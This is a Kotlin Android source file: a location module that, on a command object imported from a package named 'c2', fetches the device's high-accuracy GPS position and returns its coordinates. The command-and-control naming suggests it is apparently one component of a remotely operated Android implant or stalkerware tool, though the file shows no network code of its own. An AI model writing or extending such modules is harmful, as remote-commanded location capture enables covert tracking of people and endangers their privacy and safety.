package org.synapse.core.modules

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import androidx.core.content.ContextCompat
import com.google.android.gms.location.*
import org.synapse.core.c2.Command
import org.synapse.core.core.SynapseResponse
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import kotlin.coroutines.resume

object LocationModule {

    suspend fun get(context: Context, cmd: Command): SynapseResponse {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            return SynapseResponse.ErrorResponse(error = "no_location_permission", module = "location")
        }

        return try {
            val client = LocationServices.getFusedLocationProviderClient(context)
            val location = withTimeoutOrNull(15_000L) {
                suspendCancellableCoroutine<Location?> { cont ->
                    client.getCurrentLocation(
                        Priority.PRIORITY_HIGH_ACCURACY, null
                    ).addOnSuccessListener { loc ->
                        cont.resume(loc)
                    }.addOnFailureListener {
                        cont.resume(null)
                    }
                }
            }

            if (location != null) {
                SynapseResponse.LocationResponse(
                    lat = location.latitude,
                    lng = location.longitude,
                    accuracy = location.accuracy,
                    provider = location.provider ?: "fused"
                )
            } else {
                SynapseResponse.ErrorResponse(error = "location_timeout", module = "location")
            }
        } catch (e: Exception) {
            SynapseResponse.ErrorResponse(error = "location:${e.message}", module = "location")
        }
    }
}
